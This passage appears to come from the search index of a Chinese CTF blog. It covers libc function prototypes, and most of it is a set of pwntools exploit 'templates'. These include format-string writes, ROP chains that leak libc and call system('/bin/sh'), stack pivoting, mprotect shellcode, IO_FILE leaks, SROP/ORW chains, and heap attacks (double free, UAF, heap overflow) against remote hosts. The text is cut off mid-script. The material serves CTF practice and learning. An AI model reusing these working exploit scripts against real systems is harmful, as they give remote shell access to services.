-c\n```\n\n","categories":["CVE"],"tags":["CVE"]},{"title":"pwn常用函数解析","url":"/2023/09/22/pwn%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90/","content":"\n\n\n# 64位传参顺序\n\n## 6个参数及以内时\n\n参数从左到右加入寄存器时：**rdi，rsi，rdx，rcx，r8，r9**\n\n## 当参数为7个以上时\n\n前6个与前面一样，但后面的依次从起，当参数对齐7个时，参数从左到右加入寄存器时：**rdi，rsi，rdx，rcx，r8，r9**。六个以上的内容加入栈中，即和32位组装一样。\n\n# 函数原型\n\n## open（open64）函数\n\n```\nint open(const char *path, int access, int mode);\n```\n\n 参数解释：\n path：要打开的文件路径和名称。\n access：访问模式，宏定义和含义如下：\n – O_RDONLY（1）：只读打开；\n – O_WRONLY（2）：只写打开；\n – O_RDWR（4）：读写打开；\n 还可选择以下模式与以上3种基本模式相与：\n – O_CREAT（0x0100）创建一个文件并打开；\n – O_TRUNC（0x0200）打开一个已存在的文件并将文件长度设置为0，其他属性保持；\n – O_EXCL（0x0400）未使用；\n – O_APPEND（0x0800）追加打开文件；\n – O_TEXT（0x4000）打开文本文件翻译CR-LF控制字符；\n – O_BINARY（0x8000）打开二进制字符，不作CR-LF翻译；\n mode：该参数仅在access=O_CREAT方式下使用，其取值如下：\n – S_IFMT（0xF000）：文件类型掩码；\n – S_IFDIR（0x4000）：目录；\n – S_IFIFO（0x1000）：FIFO 专用；\n – S_IFCHR（0x2000）：字符专用；\n – S_IFBLK（0x3000）：块专用；\n – S_IFREG（0x8000）：只为0x0000；\n – S_IREAD（0x0100）：可读；\n – S_IWRITE（0x0080）：可写；\n – S_IEXEC（0x0040）：可执行；\n\n## fopen函数\n\n函数原型：\n\n```\n**FILE *fopen(char *filename, char *mode);**\n```\n\n 参数解释：\n – filename：文件名称。\n – mode：打开模式：\n r：只读方式打开一个文本文件（该文件必须存在）；\n r+：可读可写方式打开一个文本文件（该文件必须存在）；\n w：只写方式打开一个文本文件（若文件存在则文件长度清为0，即该文件内容会消失。若文件不存在则建立该文件）；\n w+：可读可写方式创建一个文本文件（若文件存在则文件长度清为零，即该文件内容会消失。若文件不存在则建立该文件）；\n a：追加方式打开一个文本文件（若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾，即文件原先的内容会被保留。（EOF符保留））；\n a+：可读可写追加方式打开一个文本文件（若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾后，即文件原先的内容会被保留。 （原来的EOF符不保留））；\n rb：只读方式打开一个二进制文件（使用法则同r）；\n rb+：可读可写方式打开一个二进制文件（使用法则同r+）；\n wb：只写方式打开一个二进制文件（使用法则同w）；\n wb+：可读可写方式生成一个二进制文件（使用法则同w+）；\n ab：追加方式打开一个二进制文件（使用法则同a）；\n ab+：可读可写方式追加一个二进制文件（使用法则同a+）；\n 返回参数： 文件顺利打开后，指向该流的文件指针就会被返回。若果文件打开失败则返回NULL，并把错误代码存在errno  中。一般而言，打开文件后会作一些文件读取或写入的动作，若打开文件失败，接下来的读写动作也无法顺利进行，所以在fopen()后请作错误判断及处理。\n\n## 两者的区别\n\n前者属于低级IO，后者是高级IO。  前者返回一个文件描述符，后者返回一个文件指针。  前者无缓冲，后者有缓冲。  前者与 read, write 等配合使用， 后者与 fread, fwrite等配合使用。  后者是在前者的基础上扩充而来的，在大多数情况下，用后者。\n\n## write函数原型\n\n**\n\n```\nssize_t write(int fd, const void *buf, size_t count);\n```\n\n调用该函数时，需要有三个参数，下面简单的介绍下这三个参数的含义。\n\nfd：要操作的文件的文件描述符，通过open函数打开文件时获取。\n\nbuf：指定写入数据对应的缓冲区，可以将需要的写入的内容存放到buf中，再将其写入文件里。\n\ncount：指定写入的字节数，单位是字节。\n\n返回值：如果写操作顺利完成，则会返回写入的字节数；如果返回值为0，则表示未向文件中写入任何字符；如果写入出错，则会返回-1。\n\n### 一般来说\n\nfd=1时标准输出，fd=文件fd时输出到文件\n\n## read函数原型\n\nC语言中，`read`函数是用于从文件描述符中读取数据的函数，其原型如下：\n\n```c\n#include <unistd.h>\n\nssize_t read(int fd, void *buf, size_t count);\n```\n\n`read`函数的参数如下：\n\n1. `fd`：文件描述符，指定要读取的文件或套接字的标识符。\n2. `buf`：指向存储读取数据的缓冲区的指针。\n3. `count`：要读取的最大字节数。\n\n`read`函数的返回值是实际读取的字节数。如果返回值为0，表示已到达文件末尾；如果返回值为-1，表示读取出错。\n\n需要注意的是，`read`函数是一个阻塞函数，当没有数据可读时，它会一直等待直到有数据可读或出现错误。如果需要非阻塞读取数据，可以使用`select`或`poll`等函数进行操作。\n\n### 一般来说\n\nfd=0时标准输入，fd=文件fd时读取文件\n\n### fd描述符\n\n0，1，2 这三个 fd 值已经被赋予特殊含义，分别是标准输入（ STDIN_FILENO ），标准输出（ STDOUT_FILENO ），标准错误（ STDERR_FILENO ）\n\n## puts函数\n\n```c\nint puts(const char *s);\n```\n\n## printf函数\n\nprintf 函数原型为\n\n```\nint printf(const char *fmt, ...)\n```\n\n后面的参数以fmt的内容定\n\n## mprotect函数\n\n```\n#include <unistd.h>   \n#include <sys/mmap.h>   \nint mprotect(const void *start, size_t len, int prot);\n```\n\nmprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。\n\nprot可以取以下几个值，并且可以用“|”将几个属性合起来使用：\n\n1）PROT_READ：表示内存段内的内容可读；\n\n2）PROT_WRITE：表示内存段内的内容可写；\n\n3）PROT_EXEC：表示内存段中的内容可执行；\n\n4）PROT_NONE：表示内存段中的内容根本没法访问。\n\n需要指出的是，锁指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。\n\n如果执行成功，则返回0；如果执行失败，则返回-1，并且设置errno变量，说明具体因为什么原因造成调用失败。错误的原因主要有以下几个：\n\n1）EACCES\n\n该内存不能设置为相应权限。这是可能发生的，比如，如果你 mmap(2) 映射一个文件为只读的，接着使用 mprotect() 标志为 PROT_WRITE。\n\n2）EINVAL\n\nstart 不是一个有效的指针，指向的不是某个内存页的开头。\n\n3）ENOMEM\n\n内核内部的结构体无法分配。\n\n4）ENOMEM\n\n进程的地址空间在区间 [start, start+len] 范围内是无效，或者有一个或多个内存页没有映射。\n\n如果调用进程内存访问行为侵犯了这些设置的保护属性，内核会为该进程产生 SIGSEGV （Segmentation fault，段错误）信号，并且终止该进程。\n\n## Memset\n\n```\n void *memset(void *str, int c, size_t n)\n```\n\n 复制字符 c（一个无符号字符）到参数 str 所指向的字符串的前 n 个字符。其返回值是一个指向 str 的指针\n\n## Sprintf\n\n```\nint sprintf(char *str, const char *format, ...) \n```\n\n发送格式化输出到 str 所指向的字符串。\n\n第二第三个参数对应了 printf 的第一第二个参数，只是多了个输出到的位置，以及检查标签个数和参数个数相同。\n\n如果成功，则返回写入的字符总数，不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。\n\n## Strncmp\n\n```\nint strncmp(const char *str1, const char *str2, size_t n)\n```\n\n把 str1 和 str2 进行比较，最多比较前 n 个字节。\n\n这个比较是通过逐个比较ascii码实现的，遇到ascii码不同直接返回\n\n如果返回值 < 0，则表示 str1 小于 str2。\n\n如果返回值 > 0，则表示 str1 大于 str2。\n\n如果返回值 = 0，则表示 str1 等于 str2。\n\n## fgets\n\nfgets函数功能为从指定的流中读取[数据](https://baike.baidu.com/item/数据/33305?fromModule=lemma_inlink)，每次读取一行。其原型为：\n\n```\nchar *fgets(char *str, int n, FILE *stream);\n```\n\n从指定的流 stream 读取一行，并把它存储在 str  所指向的字符串内。当读取 (n-1) 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。\n\n## scanf()\n\n**原型：** \n\n```\n`int scanf(const char *format, ...);`\n```\n\n","categories":["备忘"]},{"title":"fmt模板","url":"/2023/09/26/%E6%A8%A1%E6%9D%BF/fmt%E6%A8%A1%E6%9D%BF/","content":"\n# 常见非预期解\n\n```\nfor i in range(1, 100):\n    try:\n        # r=process('./pwn')\n        r = remote('node4.buuoj.cn', 26477)\n        elf = ELF('./pwn')\n        r.sendlineafter(\"Give me your name:\", 's')\n        for j in range(3):\n            r.recvuntil(\"food: \")\n            r.sendline('%' + str(10 + 3 * i + j) + '$s.')\n            print(i, r.recvuntil(b'.', drop=True))\n    except EOFError:\n        pass\n```\n\n# fmt不在栈上\n\n```\nfrom pwn import *\ncontext(os='linux',arch='amd64')  #need tmux\ncontext.log_level=\"debug\"\n\n# p = remote(\"node4.buuoj.cn\", 26443)\np = process(\"./pwn\")\np.sendlineafter(\"Give me your name:\", b\"/bin/sh\")\n\np.sendlineafter(\"food:\", b'%9$p^%11$p^')\nlibc_base = int(p.recvuntil(\"^\")[10:-1], 16) - 0x20750 - 240  # __libc_start_main\nstack = int(p.recvuntil(\"^\")[:-1], 16)\ni_addr = stack - 0x7ffc0bd8af08 + 0x7ffc0bd8ae40\none = libc_base + 0x45226\nprint(hex(one))\np.sendlineafter(\"food:\", \"%{}p%11$hn\".format((i_addr - 0x30 + 4) & 0xffff))\n# attach(p)\np.sendlineafter(\"food:\", \"%{}p%37$hhn\".format(1))\n\np.sendlineafter(\"food:\", \"%{}p%11$hn\".format((i_addr - 0x18) & 0xffff))\n# attach(p)\np.sendlineafter(\"food:\", \"%{}p%37$hn\".format(one & 0xffff))\n\np.sendlineafter(\"food:\", \"%{}p%11$hn\".format((i_addr - 0x18 + 2) & 0xffff))\n# attach(p)\np.sendlineafter(\"food:\", \"%{}p%37$hhn\".format((one & 0xff0000) // 0x10000))\nfor i in range(8):\n    p.sendlineafter(\"food:\", \"1\")\n# attach(p)\np.sendlineafter(\"food:\", \"1\")\nprint(hex(libc_base))\np.interactive()\n```\n\n","categories":["模板"],"tags":["shellcode"]},{"title":"rop模板","url":"/2023/09/26/%E6%A8%A1%E6%9D%BF/rop%E6%A8%A1%E6%9D%BF/","content":"\n\n\n```\n不用libcsearcher的时候用\n\nnext(libc.search(b'/bin/sh'))\n\n用的时候用\n\nlibc.dump('str_bin_sh')\n```\n\n\n\n# 32位printf\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level=\"debug\"\np = remote('node4.buuoj.cn',28619)\nelf=ELF(\"pwn2_sctf_2016\")\nlibc=ELF(\"libc-2.23.so\")\np.sendlineafter(\"read?\",b'-1')\n\nesi_edi_ebp=0x0804864d\natoi_got=elf.got[\"atoi\"]\nprintf_plt=elf.plt[\"printf\"]\n\nformat_str=0x080486F8\nmain_addr=elf.sym[\"main\"]\n\npayload=(0x2c+4)*b'a'+p32(printf_plt) +p32(main_addr)  +p32(format_str) +p32(atoi_got)\np.sendlineafter(\"data!\",payload)\natoi_addr=u32(p.recvuntil(\"\\xf7\")[-4:])\nprint(hex(atoi_addr))\n\nlibc_base=atoi_addr-libc.sym[\"atoi\"]\nsystem_addr=libc_base+libc.sym[\"system\"]\nbin_sh=libc_base+next(libc.search(b'/bin/sh'))\nret=0x08048346\np.sendlineafter(\"read?\",b'-1')\npayload_=(0x2c+4)*b'a'+p32(ret)+p32(system_addr)+p32(main_addr)+p32(bin_sh)\np.sendlineafter(\"data!\",payload_)\np.interactive()\n```\n\n# 64位printf\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level=\"debug\"\np = remote('node4.buuoj.cn',29207)\nelf=ELF(\"babyrop2\")\nlibc=ELF(\"libc.so.6\")\nrdi=0x0000000000400733\nrsi_r15_ret=0x0000000000400731\nprintf_plt=elf.plt[\"printf\"]\nread_got=elf.got[\"read\"]\nformat_str=0x0000000000400770\nmain_addr= elf.sym[\"main\"]\npayload(0x20+8)*b'a'+p64(rdi)+p64(format_str)+p64(rsi_r15_ret)+p64(read_got)+p64(0)+p64(printf_plt)+p64(main_addr)\np.sendlineafter(\"What's your name?\",payload)\nread_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\nlibc_base=read_addr-libc.sym[\"read\"]\nsystem_addr=libc_base+libc.sym[\"system\"]\nbin_sh_addr=libc_base+next(libc.search(b'/bin/sh'))\npayload_=(0x20+8)*b'a'+p64(rdi)+p64(bin_sh_addr)+p64(system_addr)\np.sendlineafter(\"What's your name?\",payload_)\np.interactive()\n\n\n\n```\n\n# 32位puts\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext(arch='i386', log_level='debug', os='linux')\nelf=ELF('Game')\nlibc=ELF('libc-2.23.so')\nelf=ELF('Game')\n#p = process('Game')\n\nstar=0x080485F4\n\np= remote(\"123.60.135.228\",2136)\nputs_plt=elf.plt[\"puts\"]\nputs_got=elf.got[\"puts\"]\n\n\np.sendlineafter(\"Do you play game?\",b'yes')\np.sendlineafter(\"Do you think playing games will affect your learning?\",b'yes')\n\npayload=(0x6c+4)*b'a'+p32(puts_plt)+p32(star)+p32(puts_got)\np.sendlineafter(\"I think the same as you!\",payload)\n\np.recvline()\nputs_addr= u32(p.recvuntil(\"\\xf7\")[-4:])\nprint(hex(puts_addr))\nlibc=LibcSearcher('puts',puts_addr)\n\nret=0x080483ea\n\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\npayload=(0x6c+4)*b'a'+p32(ret)+p32(system_addr)+p32(star)+p32(binsh_addr)\n\np.sendlineafter(\"I think the same as you!\",payload)\n\np.interactive()\n```\n\n# 64位puts\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level=\"debug\"\np = remote('node4.buuoj.cn',28552)\nelf=ELF(\"bjdctf_2020_babyrop\")\nmain_addr = elf.sym['main']\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\npop_rdi_ret=0x0000000000400733\n\n\npayload =b'a' * 40 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)\np.sendlineafter(\"Pull up your sword and tell me u story!\",payload)\nputs_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(hex(puts_addr))\n\nlibc = LibcSearcher('puts', puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\nret_addr=0x00000000004004c9\n\npayload2 = b'a' * 40 +p64(ret_addr)+p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)\np.sendlineafter(\"Pull up your sword and tell me u story!\",payload2)\np.interactive()\n```\n\n# 64位write\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level=\"debug\"\np = remote('node4.buuoj.cn',26446)\nelf=ELF(\"level3_x64\")\nmain_addr = elf.sym['main']\nwrite_plt = elf.plt['write']\nwrite_got = elf.got['write']\npop_rdi_ret=0x00000000004006b3\npop_rsi_r15_ret=0x00000000004006b1\n\npayload =b'a' * (0x80+8) + p64(pop_rdi_ret) +p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(0) +p64(write_plt)+ p64(main_addr)\np.sendlineafter(\":\",payload)\n\nwrite_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(hex(write_addr))\n\nlibc = ELF(\"libc-2.23.so\")\nlibc_base = write_addr - libc.sym['write']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\nret_addr=0x00000000004004c9\n\npayload2 =b'a' * (0x80+8)  +p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)\np.sendlineafter(\":\",payload2)\np.interactive()\n```\n\n# libc不匹配别害怕，这样搞\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\np = remote(\"123.60.135.228\",2082)\n#p= process('./sleep')\ncontext.log_level=\"debug\"\nelf=ELF(\"sleep\")\nmain_addr = 0x0000000004006BD\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\ngets_plt = 0x000000000400550\npop_rdi_ret=0x0000000000400783\n\npayload =b'a' * (0x70+8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)+p64(main_addr)\n#attach(p)\np.sendlineafter(\"Please cherish every second of sleeping time !!!\",payload)\n#p.interactive()\nputs_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(hex(puts_addr))\n\nlibc = LibcSearcher('puts', puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = 0x0000000000601040\nret_addr = 0x0000000000400501\n#attach(p)\npayload2 = b'a' * (0x70+8) +p64(ret_addr)+p64(pop_rdi_ret) + p64(0x000000000601040)+p64(gets_plt)+p64(ret_addr)+p64(main_addr)\n\np.sendlineafter(\"Please cherish every second of sleeping time !!!\",payload2)\nsleep(2)\np.sendline(b'/bin/sh\\0')\n\npayload2 = b'a' * (0x70+8) +p64(ret_addr)+p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)\np.sendlineafter(\"Please cherish every second of sleeping time !!!\",payload2)\np.interactive()\n```\n\n# 栈迁移\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\n\ncontext(arch='amd64', log_level='debug', os='linux')\np=remote('123.60.135.228',2095)\n\nsys_addr=0X08048420\nleave_ret=0x080484d8\n#p=process(\"./pwn3\")\npayload=b'a'*40\n#attach(p)\np.sendafter(\"Please input your name:\",payload)\nebp= u32(p.recvuntil(\"\\xff\")[-4:])-16\nprint(hex(ebp))\n\npayload2=b'aaaa'+p32(sys_addr)+4*b'a'+p32(ebp-24)+b'/bin/sh'+b'\\0'+16*b'a'+p32(ebp-40)+p32(leave_ret)\n#                4            8     12             16           23   24       40            44\n#        40     36            32    28             24          17    16        0\n#attach(p)\np.sendafter(\"Would you like tell me some message:\",payload2)\np.interactive()\n```\n\n# 利用mprotect\n\n```python\nfrom pwn import * \n\n q = remote('node3.buuoj.cn',29645) \n\n \\#q = process('./get_started_3dsctf_2016') \n\n context.log_level = 'debug' \n\n mprotect = 0x0806EC80 \n\n buf = 0x80ea000 \n\n pop_3_ret = 0x0804f460 \n read_addr = 0x0806E140 \n payload = 'a'*56 \n payload += p32(mprotect) \n payload += p32(pop_3_ret) \n payload += p32(buf) \n payload += p32(0x1000) \n payload += p32(0x7) \n payload += p32(read_addr) \n payload += p32(buf) \n payload += p32(0) \n payload += p32(buf) \n payload += p32(0x100) \n q.sendline(payload) \n sleep(0.1) \n\n\n shellcode = asm(shellcraft.sh(),arch='i386',os='linux') \n q.sendline(shellcode) \n sleep(0.1) \n q.interactive() \n\n   \n```\n\n# IOFILE\n\n```\n# coding=utf-8\nfrom pwn import *\nfrom LibcSearcher import *  \nfrom ctypes import *\n\n# context.log_level = \"debug\"\ncontext.arch = \"amd64\"\np = remote('10.52.13.156', 53493)\n# p = process('./feedback')\n\np.sendlineafter(\"Which list do you want to write?\",b\"-8\")\npayload = p64(0xFBAD1800) + p64(0)*3 + b'\\x00'\np.sendlineafter(\".\\n\",payload)\n\np.recvuntil(b'\\x00'*8)\nlibc_base = u64(p.recv(8)) - 0x1ec980\nsuccess(hex(libc_base))\nflag = libc_base + 0x1f1700\n\np.sendlineafter(\"?\",b\"-11\")\np.sendlineafter(\".\",b'\\x68')\np.sendlineafter(\"?\",b\"-11\")\np.sendlineafter(\".\",p64(flag))\n\np.interactive()\n```\n\n# srop\n\n```\nfrom pwn import *\ncontext.arch='amd64'\ncontext.log_level='debug'\npower_rop1=0x0000000000400806\npower_rop2=0x00000000004007F0\nbuf_inp=0x0000000000601039\npop_rbp=0x0000000000400628\nbss_addr=0x0000000000601050\ndef getpower(avg1,avg2,avg3,got):\n    payload=p64(power_rop1)+p64(0)+p64(0)+p64(1)+p64(got)+p64(avg1)+p64(avg2)+p64(avg3)\n    payload+=p64(power_rop2)+p64(0)*7#为什么是7呢，因为虽然只有6个pop但是上面还有个rsp+8\n    return payload\n\n# p=process('./pwn')\np=process('../出题/pwn3/pwn')\n# p=remote('162.14.104.152','10017')\n# p=remote('nepctf.1cepeak.cn','31507')\n\nelf=ELF('pwn')\nlibc=ELF('./libc-2.27.so')\nsyscall_got=elf.got['syscall']\nseccomp_init_got=elf.symbols['seccomp_init']\n# pause()\n# gdb.attach(p,'b *0x000000000040078D')\n# pause()\n\n\npayload=b'flag\\x00\\x00\\x00\\x00'*(0x30//8)+p64(0x4007b0)\npayload+=getpower(0,0,buf_inp,syscall_got)\n# payload+=getpower(buf_inp,0,0,syscall_got)\npayload+=getpower(1,1,syscall_got,syscall_got)\npayload+=p64(pop_rbp)+p64(buf_inp+8)\n# payload+=getpower(0,0,buf_inp+0x10,syscall_got)\n# payload+=getpower(1,syscall_got,0x20,syscall_got)\n# payload+=p64(elf.symbols['__libc_start_main'])\npayload+=p64(0x000000000040076D)\n# payload+=getpower(buf_inp,0,2,syscall_got)\n# payload+=getpower(3,buf_inp+0x6,0x30,syscall_got)\n# payload+=getpower(1,buf_inp+0x6,0x30,syscall_got)\np.sendlineafter(b'!!!\\n',payload)\n# p.sendlineafter(b'NepCTF2023!\\n',payload)\npause()\np.sendline(b'flag\\x00\\x00\\x00\\x00'+p64(0x601000))\n# pause()\n\n# payload=b'a'*0x30+p64(0x4007b0)\n# payload+=getpower(1,1,syscall_got,syscall_got)\n# payload+=p64(0x000000000040076D)\n# p.sendlineafter(b'NepCTF2023!\\n',payload)\n\n\n# pause()\n# # p.sendline(b'')# 控制rax为1\n# # # 接收libc\nrecvaddr=p.recvuntil(b'\\x7f')\nsysaddr=u64(recvaddr[-6:].ljust(8,b'\\x00'))\nprint(hex(sysaddr))\nlibcbase=sysaddr-libc.symbols['syscall']\nprint('libcbase',hex(libcbase))\n\npop_rax=libcbase+0x000000000001b500\nopen_addr=libcbase+libc.symbols['open']\nread_addr=libcbase+libc.symbols['read']\nwrite_addr=libcbase+libc.symbols['write']\npop_rdi=0x0000000000400813\npop_rdx_rsi=libcbase+0x0000000000130539\npop_rsp=libcbase+0x000000000000396c\npop_rcx=libcbase+0x00000000000e433e\n\npayload=b'flag\\x00\\x00\\x00\\x00'*(0x30//8)+p64(0x4007b0)\npayload+=p64(pop_rax)+p64(2)+p64(pop_rcx)+p64(0)\n# payload+=getpower(buf_inp,0,0,syscall_got)\npayload+=flat([pop_rdi,buf_inp,pop_rdx_rsi,0,0,pop_rbp,buf_inp+0x30,sysaddr+23])\npayload+=p64(pop_rax)+p64(0)\npayload+=flat([pop_rdi,3,pop_rdx_rsi,0x30,buf_inp,sysaddr+23])\npayload+=p64(pop_rax)+p64(1)\npayload+=flat([pop_rdi,1,pop_rdx_rsi,0x30,buf_inp,sysaddr+23])\n# payload+=flat([pop_rdi,buf_inp-1,pop_rdx_rsi,0,0,open_addr])\n# payload+=\npayload+=p64(0x000000000040076D)\nprint('len',len(payload))\n# p.sendlineafter(b'NepCTF2023!\\n',payload)\np.sendlineafter(b'!!!\\n',payload)\n\n# # pop_rax=libcbase+0x000000000001b500\n# # payload2=\n\np.interactive()\n\n\n```\n","categories":["模板"],"tags":["rop"]},{"title":"heap模板","url":"/2023/09/26/%E6%A8%A1%E6%9D%BF/heap%E6%A8%A1%E6%9D%BF/","content":"\n# double free\n\n```\nfrom pwn import *\n\ncontext(arch='i386', log_level='debug', os='linux')\n\n#p = process('./heap_Double_Free')\np=remote('123.60.135.228', 2056)\n\ndef fulltcache():\n    for i in range(7):\n        malloc(i, b'qwer')\n    for i in range(7):\n        free(i)\n\ndef malloc(id, contet):\n    p.sendlineafter('root@ubuntu:~/Desktop$', b'1')\n    p.sendlineafter('please input id and size :', str(id))\n    sleep(0.1)\n    p.sendline(b'100')\n    p.sendlineafter('please input contet:', contet)\n\ndef free(id):\n    p.sendlineafter('root@ubuntu:~/Desktop$', b'2')\n    p.sendlineafter('please input id :', str(id))\n\ndef print(id):\n    p.sendlineafter('root@ubuntu:~/Desktop$', b'3')\n    p.sendlineafter('please input id :', str(id))\n\n\nfulltcache()\n\nmalloc(1, b'qwer')\nmalloc(2, b'qwer')\nmalloc(3, b'qwer')\n\n\nfree(1)\nfree(2)\nfree(1)\n\n#attach(p)\nmalloc(4,p64(0x006010A0))#可修改的内容在这个地址后16字节\nmalloc(5,b'qwer')\nmalloc(6,b'qwer')\nmalloc(7,p64(257))\np.interactive()\n\n```\n\n# uaf\n\n```\nfrom pwn import *\n\ncontext(arch='i386', log_level='debug', os='linux')\nelf=ELF(\"./pwn\")\n\n\ndef malloc(size, contet):\n    p.sendlineafter(\"5. exit\", b'1')\n    p.sendlineafter(\"--->\", str(size))\n    p.sendafter(\"--->\", contet)\ndef free(id):\n    p.sendlineafter(\"5. exit\", b'3')\n    p.sendlineafter(\"--->\", str(id))\n\ndef edit(id,size,contet):\n    p.sendlineafter(\"5. exit\", b'2')\n    p.sendlineafter(\"--->\", str(id))\n    p.sendlineafter(\"--->\", str(size))\n    p.sendafter(\"--->\", contet)\n\ndef show(id):\n    p.sendlineafter(\"5. exit\", b'4')\n    p.sendlineafter(\"--->\", str(id))\n\n\n# p = process('./pwn')\np = remote('node4.buuoj.cn', 26517)\nlibc = ELF('libc-2.23.so')\nmalloc(0x80, b'qwer')\nmalloc(0x80, b'qwer')\nmalloc(0x68, b'qwer')\nmalloc(0x68, b'qwer')\nmalloc(0x68, b'/bin/sh')\n\nfree(0)\nshow(0)\np.recvuntil(\":\")\nlibc_base = u64(p.recv(7)[1:] + b'\\0' * 2) - 0x7fef613c4b78 + 0x7fef61000000\nsystem = libc_base + libc.sym[\"system\"]\nfree_got = elf.got['free']\n# pause()\nfree(2)\nfree(3)\nfree(2)\nmalloc(0x68, p64(0x0000000006020C0 - 0x23))\nmalloc(0x68, 'ase')\nmalloc(0x68, 'ase')\nprint(hex(libc_base))\nprint(hex(free_got))\nmalloc(0x68, b'a' * (0x23 - 0x10) + p64(free_got))\n# attach(p)\nedit(0, 10, p64(system))\np.sendlineafter(\"5. exit\", b'3')\np.sendlineafter(\"--->\", b'4')\np.interactive()\n```\n\n# 2.27uaf\n\n```\nfrom struct import pack\ncontext.log_level='debug'\ncontext(os = 'linux', arch = 'amd64')\n\n#p = process('./pwn')\np = remote('43.142.108.3', 28585)\nelf = ELF('./pwn')\n#libc = ELF('buu/libc-2.27-x64.so')\n#libc = ELF('glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')\nlibc = ELF('libc-2.27.so')\n\ndef debug():\n\tgdb.attach(p)\n\tpause()\ndef add(size, name, content):\n\tp.sendlineafter(b'Choice: \\n', '1')\n\tp.sendlineafter(b'Size:\\n', str(size))\n\tp.sendafter(b'Name: \\n', name)\n\tp.sendafter(b'Content:\\n', content)\ndef free(index):\n\tp.sendlineafter(b'Choice: \\n', '2')\n\tp.sendlineafter(b'idx:\\n', str(index))\ndef show(index):\n\tp.sendlineafter(b'Choice: \\n', '3')\n\tp.sendlineafter(b'idx:\\n', str(index))\ndef edit(index, content):\n\tp.sendlineafter(b'Choice: \\n', '4')\n\tp.sendlineafter(b'idx:\\n', str(index))\n\tp.send(content)\n# leak libcbase\nadd(0x410, b'1', b'a') #index 0\nadd(0x20, b'1', b'a') #index 1\nadd(0x10, b'1', b'a') #index 2\nfree(0)\nshow(0)\nlibcbase = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) - 96 - 0x10 - libc.sym['__malloc_hook']\nprint(' libcbase -> ', hex(libcbase))\n\n# malloc_hook -> one_gadget\none_gadget = libcbase + 0x10a2fc\nmalloc_hook = libcbase + libc.sym['__malloc_hook']\nfree(1)\nedit(1, p64(malloc_hook))\nadd(0x10, b'1', b'a') #index 3\nadd(0x20, b'1', b'a') #index 4\nedit(4, p64(one_gadget))\n\n# pwn\np.sendlineafter(b'Choice: \\n', '1')\np.sendlineafter(b'Size:\\n', b'10')\np.interactive()\n\n```\n\n# 堆溢出\n\n```\nfrom pwn import *\n\ndef connetc():\n    global p,elf,libc\n    p=remote('192.168.109.168',10000)\n    #p=process('./Emo_Chunk')\n    elf=ELF('./Emo_Chunk')\n    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n#context.log_level='debug'\ndef add(size):\n p.sendlineafter(\"Please Choice!\",'1')\n p.sendlineafter(\"Please Input Size:\",str(size))\n\ndef dele(index):\n p.sendlineafter(\"Please Choice!\",'2')\n p.sendlineafter(\"Please Input index:\",str(index))\n\ndef show(index):\n p.sendlineafter(\"Please Choice!\",'4')\n p.sendlineafter(\"Please Input index:\",str(index))\ndef edit(index,content):\n p.sendlineafter(\"Please Choice!\",'3')\n p.sendlineafter(\"Please Input index:\",str(index))\n p.sendlineafter(\"Change EMo Content\",content)\ndef pwn(i,j):\n    add(0x68)#0\n    add(0x68)#1\n    add(0x68)#2\n    add(0x68)#3\n    add(0x68)#4\n    add(0x68)#5\n  \n    edit(0,'a'*0x68 + '\\xe1' + '\\x00'*7)\n  \n    dele(1)\n    add(0x68)\n    show(2)\n    p.recvuntil('\\n')\n\n    addr = u64(p.recv(6).ljust(8,'\\x00'))\n    print(\"addr : \" + hex(addr-0x3c4b78))\n  \n    libc_addr = addr - 0x3c4b78\n    dele(4)\n    edit(3,'a'*0x68 + p64(0x71) + p64(libc_addr+libc.symbols['__malloc_hook']-0x23))\n    print(hex(libc_addr+libc.symbols['__malloc_hook']-0x23))\n\n    realloc_hook = libc_addr + libc.sym['__realloc_hook']\n    log.info(\"realloc_hook:\"+hex(realloc_hook))\n    realloc = libc_addr + libc.sym['realloc']\n    log.info(\"realloc:\"+hex(realloc))\n  \n    add(0x68) #4\n\n    add(0x68) #6\n    one = [0x45226,0x4527a,0xf03a4,0xf1247]\n    edit(6,cyclic(11)+p64(libc_addr+one[i]) + p64(realloc + j))\n    add(0x30)\n\n    p.interactive()\nfor i in range(4):\n for j in 